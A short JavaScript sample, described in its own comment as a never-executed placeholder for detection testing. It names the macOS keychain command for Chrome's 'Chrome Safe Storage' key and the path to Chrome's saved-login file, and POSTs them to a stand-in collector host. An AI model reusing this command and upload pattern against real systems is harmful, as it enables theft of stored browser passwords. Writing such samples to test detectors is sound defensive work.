// Placeholder sample for detection testing only. Nothing here is executed.
const cmd = "security find-generic-password -ga 'Chrome Safe Storage'";
const files = ['~/Library/Application Support/Google/Chrome/Default/Login Data'];
fetch('https://collector.example.invalid/upload', { method: 'POST', body: cmd + files.join(',') });
